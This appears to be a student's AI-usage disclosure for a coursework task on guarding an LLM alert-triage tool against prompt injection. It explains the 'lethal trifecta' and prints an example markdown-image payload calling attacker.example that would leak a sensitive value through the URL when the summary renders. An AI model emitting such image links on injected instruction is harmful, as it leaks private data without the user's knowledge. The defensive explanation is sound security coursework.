# AI usage: dsc26-cyb-w06

Keep the three headings below exactly as they are. The grader stops and scores 0 if this file is
missing or any of the three headings is missing. It does not score what you write; your Track
Mentor reads it, and the W8 defence can ask about it.

## Tools

I used Muse, my AI assistant, to write the first draft of the three modules in copilot_guard from the DSC task spec, and to run the five public tests. I checked the code myself against the spec and the test output before submitting it.

## What AI got wrong

<!-- At least one thing an AI tool got wrong that you changed, and how you noticed:
     a test, the docs, running it. -->

## In my own words

1. Which leg of the lethal trifecta does stripping markdown images remove, and why does that matter for Hisn?

The exfiltration leg, meaning the ability to communicate with the outside world. The trifecta is private data, untrusted content, and an external communication channel. A markdown image isn't just formatting, because the client fetches the URL as soon as it renders. If injected text gets the model to emit ![x](https://attacker.example/log?d=TEN-014), the sensitive value leaves in the query string with no click and no tool call, and the analyst never notices. Stripping images from the summary means rendering it triggers no outbound fetch, so that channel is closed.

2. Why does `triage` raise the severity of an alert that contains an injection attempt instead of just warning?

An injection attempt means the alert content was written by someone trying to steer the model, so the model's own severity and next-step output can't be trusted. Attackers usually aim to push the alert toward low or monitor so the real incident stays hidden. A warning attached to a low verdict leaves the attacker's goal intact, since the alert can still be skimmed past. Forcing severity up to at least high and changing monitor to escalate_to_analyst makes the safe outcome the default: a human reviews it, and the injection attempt itself becomes the thing worth investigating.

It also fails safe. The decision doesn't depend on the model resisting the injection, which can't be guaranteed. The code applies the bump deterministically once the injection check fires.
